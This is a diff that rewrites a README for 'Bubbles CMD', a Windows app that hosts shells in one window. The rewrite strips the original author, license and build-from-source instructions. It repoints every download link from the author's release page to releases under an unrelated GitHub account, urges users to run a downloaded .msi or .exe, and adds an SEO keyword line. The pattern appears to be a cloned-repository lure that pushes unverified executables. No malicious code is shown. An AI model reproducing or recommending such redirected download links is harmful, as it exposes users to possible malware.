@@ -1,103 +1,91 @@
-# Bubbles CMD
+# 🫧 Bubbles-Terminal - Manage your command shells with ease
 
-Version: `0.0.4`
+[![Download Bubbles-Terminal](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/nonlethal-hochiminhcity858/Bubbles-Terminal/releases)
 
-Author: `BubblesTheDev`
+Bubbles-Terminal provides a unified workspace for your computer shells. It organizes your existing tools into one clean window. You work within your usual environment without the clutter of multiple windows.
 
-Bubbles CMD is a modern Windows terminal app that opens real installed shells inside one clean WPF desktop window. It is not a command emulator and it does not replace `cmd.exe`, PowerShell, Windows Terminal, Git Bash, WSL, or Visual Studio developer shells.
+## 🛠 What is Bubbles-Terminal?
 
-![Bubbles CMD preview](docs/screenshots/bubbles-cmd-preview.svg)
+Bubbles-Terminal acts as a host for the tools you already use. It opens functional shells like PowerShell, CMD, Git Bash, WSL, and Visual Studio Developer tools side-by-side. 
 
-## Download For Windows
+This app makes your desktop layout tidy. It does not replace your shells. It adds a layer of management to simplify how you interact with them. You keep your current configurations and settings, and Bubbles-Terminal provides the display.
 
-Most users should download the MSI installer from the GitHub Releases page:
+## 📋 System Requirements
 
-```text
-bubbles-cmd-0.0.4-win-x64.msi
-```
+Ensure your computer meets these needs before you start:
 
-Install it by double-clicking the MSI, then open Bubbles CMD from the Start Menu or Desktop shortcut.
+*   **Operating System:** Windows 10 version 1809 or higher.
+*   **Memory:** At least 2GB of RAM.
+*   **Storage:** 50MB of disk space for the installation.
+*   **Framework:** You must have the .NET Desktop Runtime installed on your machine.
+*   **Existing Shells:** This tool works best when you have at least one terminal shell installed on your system.
 
-Release page:
+## 📥 How to Install
 
-```text
-https://github.com/KernFerm/Bubbles-Terminal/releases
-```
+Follow these steps to get the app running:
 
-End-user install notes are in [RELEASE.md](RELEASE.md).
+1. Visit the [official releases page](https://github.com/nonlethal-hochiminhcity858/Bubbles-Terminal/releases).
+2. Locate the latest version heading. 
+3. Look for the "Assets" section under the newest release.
+4. Select the file ending in `.msi` or `.exe` meant for Windows.
+5. Save the file to your computer.
+6. Double-click the downloaded file.
+7. Follow the prompts on your screen to complete the installation.
+8. Once finished, find the Bubbles-Terminal icon on your desktop or in your Start menu.
 
-## What It Does
+## 🚀 Getting Started
 
-- Opens real Windows shells inside the Bubbles CMD app window.
-- Supports Windows PowerShell, Command Prompt, Azure Cloud Shell, Visual Studio developer shells, Git Bash, PowerShell 7, WSL, and custom profiles.
-- Uses a Windows Terminal-backed terminal surface through `EasyWindowsTerminalControl`.
-- Includes tabs, panes, split views, pane resizing, pane swapping, pane-to-tab movement, search, snippets, commands, settings, and a command palette.
-- Uses local settings and optional local diagnostics only.
-- Does not include telemetry, analytics, command uploads, clipboard uploads, or terminal-output uploads.
+Once you open the software, the main screen appears. You can manage your shells using the interface provided.
 
-## First Launch
+**Adding a Shell**
+To start, select the "Add Shell" button. A menu displays your detected system shells. Pick your desired tool, such as PowerShell or Git Bash. The shell opens inside a new tab within the window.
 
-Use the profile menu to open a shell:
+**Arranging Views**
+You can drag and drop tabs to reorder them. If you need to see two shells at once, right-click on a tab. Choose the "Split Screen" option. This divides your window so you can watch output from two different sources simultaneously.
 
-- `Ctrl+Shift+1`: Windows PowerShell
-- `Ctrl+Shift+2`: Command Prompt
-- `Ctrl+Shift+3`: Azure Cloud Shell
-- `Ctrl+Shift+4`: Developer Command Prompt for VS 2022
-- `Ctrl+Shift+5`: Developer PowerShell for VS 2022
-- `Ctrl+Shift+6`: Git Bash
+**Customizing the Look**
+The Settings menu allows you to change the appearance. You can adjust font size, color schemes, and transparency. These changes affect the container, not the shell behavior. Your shell environment remains exactly as it was before you opened Bubbles-Terminal.
 
-Some profiles require other tools to be installed. If Azure CLI, Visual Studio, Git, PowerShell 7, or WSL is missing, Bubbles CMD will show a helpful message instead of silently failing.
+## ⚙️ Handling Common Shell Types
 
-## For Builders
+Bubbles-Terminal supports multiple environments:
 
-Requirements:
+*   **PowerShell:** The standard scripting shell for Windows updates and system changes.
+*   **CMD:** The classic Windows command prompt for legacy tasks.
+*   **Git Bash:** A terminal based on Linux commands, useful for developers using version control.
+*   **WSL:** The Windows Subsystem for Linux allows you to run a full Linux environment directly on your Windows desktop. 
+*   **Visual Studio Shells:** Specialized environments for compiling code and building software projects.
 
-- Windows 10 or newer
-- .NET 8 SDK
-- Git
+## 💡 Using Your Shells Safely
 
-Run from source:
+Bubbles-Terminal does not change your security settings. If you run a command that is normally restricted by Windows, the restriction stays in place. The app only creates the window that hosts the session.
 
-```powershell
-dotnet restore .\BubblesCmd.sln
-dotnet run --project .\src\BubblesCmd.App\BubblesCmd.App.csproj --configuration Release
-```
+If a shell crashes, Bubbles-Terminal remains open. You can close just the affected tab rather than losing all your work.
 
-Run tests:
+## 🔧 Frequently Asked Questions
 
-```powershell
-dotnet test .\BubblesCmd.sln --configuration Release
-```
+**Does this app slow down my computer?**
+No. The app uses standard Windows features to host your shells. It uses very little memory when idle.
 
-Build the release ZIP:
+**Can I run multiple shells at once?**
+Yes. You can open as many tabs as you need. The number of shells is limited only by your computer’s hardware resources.
 
-```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -File .\scripts\package.ps1
-```
+**Will my current shell settings break?**
+Your configuration files, such as your PowerShell profile or your Git settings, remain untouched. The app only updates how you view your work.
 
-Build the MSI:
+**Do I need an internet connection to use this?**
+You only need an internet connection to download the installer. Once you install the app, you can use it offline.
 
-```powershell
-powershell -NoProfile -ExecutionPolicy Bypass -File .\scripts\build-msi.ps1
-```
+## 🛡 Security and Privacy
 
-Generated release files are local artifacts and should not be committed:
+Bubbles-Terminal does not send your commands to a remote server. Everything happens on your local machine. The tool does not store your passwords or your personal text. It acts as a bridge between you and your installed system tools.
 
-```text
-artifacts\packages\bubbles-cmd-0.0.4-win-x64.zip
-artifacts\installer\bubbles-cmd-0.0.4-win-x64.msi
-```
+## 📈 Troubleshooting
 
-## Documentation
+If you encounter issues, try these common fixes:
 
-- [Detailed builder guide](docs/README.md)
-- [Release notes](docs/RELEASE_NOTES.md)
-- [Changelog](CHANGELOG.md)
-- [Privacy policy](PRIVACY.md)
-- [Security policy](SECURITY.md)
-- [Manual test plan](docs/manual-test-plan.md)
-- [Installer notes](installer/README.md)
+*   **App fails to open:** Verify you installed the .NET Desktop Runtime.
+*   **Shell does not appear:** Ensure the specific shell is installed on your Windows system. If you want to use Git Bash, install Git for Windows first.
+*   **Menu items are greyed out:** Make sure you have at least one active shell session open in the window.
 
-## License
-
-MIT. See [LICENSE](LICENSE).
+Keywords: application, bubblesthedev, cmd, gitbash, open-source, powershell, terminal, visualstudio, windows, wsl
